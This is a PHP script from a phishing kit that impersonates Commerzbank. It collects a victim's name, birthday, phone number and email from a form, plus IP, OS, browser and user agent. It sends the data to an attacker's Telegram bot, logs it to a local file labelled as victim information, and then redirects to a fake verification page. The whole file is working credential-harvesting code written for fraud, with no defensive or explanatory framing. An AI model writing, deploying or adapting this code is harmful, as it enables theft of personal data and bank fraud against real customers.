﻿<?php
/*


 
###############################################
#$            Coded By Gus                   $#
###############################################

                                                 .o@*hu           
                          ..      .........   .u*"    ^Rc         
                        oP""*Lo*#"""""""""""7d" .d*N.   $         
                       @  u@""           .u*" o*"   #L  ?b        
                      @   "              " .d"  .d@@e$   ?b.      
                     8                    @*@me@#         '"Nu    
                    @                                        '#b  
                  .P                                           $r 
                .@"                                  $L        $  
              .@"                                   8"R      dP   
           .d#"                                  .dP d"   .d#     
          xP              .e                 .ud#"  dE.o@"(       
          $             s*"              .u@*""     '""\dP"       
          ?L  ..                    ..o@""        .$  uP          
           #c:$"*u.             .u@*""$          uR .@"           
            ?L$. '"""***Nc    x@""   @"         d" JP             
             ^#$.        #L  .$     8"         d" d"              
               '          "b.'$.   @"         $" 8"               
                           '"*@$L $"         $  @                 
                           @L    $"         d" 8\                 
                           $$u.u$"         dF dF                  
                           $ """   o      dP xR                   
                           $      dFNu...@"  $                    
                           "N..   ?B ^"""   :R                    
                             """"* RL       d>                    
                                    "$u.   .$                     
                                      ^"*bo@"

*/
session_start();
if($_SESSION['user'] == ""){
  exit(header('location: ../'));
}
include "../config/telegram.php";
include "../config/settings.php";
$ip = getenv("REMOTE_ADDR");
 foreach($IdTelegram as $chatId) {
  $message = "[=====>  🏦  Commerz  |  INFORMATIONS  🏦  <=====]\n\n";
  $message .= "[ 🤖 First Name  :      ".$_POST['firstname']."\n";
  $message .= "[ 🤖 Last Name :      ".$_POST['lastname']."\n";
  $message .= "[ 🎉 Birthday  :      ".$_POST['dateOfBirth']."\n";
  $message .= "[ 📱 Phone Number  :      ".$_POST['phoneNumber']."\n";
  $message .= "[ 📧 Mail  :      ".$_POST['emailAddress']."\n\n";
  $message .= "[=====> VICTIM INFROMATIONS <=====]\n\n";
  $message .= "[ IP :    ".$ip."\n";   
  $message .= "[ OS :    ".$user_os."\n";  
  $message .= "[ Browser :    ".$user_browser."\n";  
  $message .= "[ UA :    ".$_SERVER['HTTP_USER_AGENT']."\n"; 
  $website= "https://api.telegram.org/bot".$botToken;
  $params=[
      'chat_id'=>$chatId, 
      'text'=>$message,
  ];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
 }
$myfile = fopen("rez.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);
header("location: ../nachprufung.php");
?>
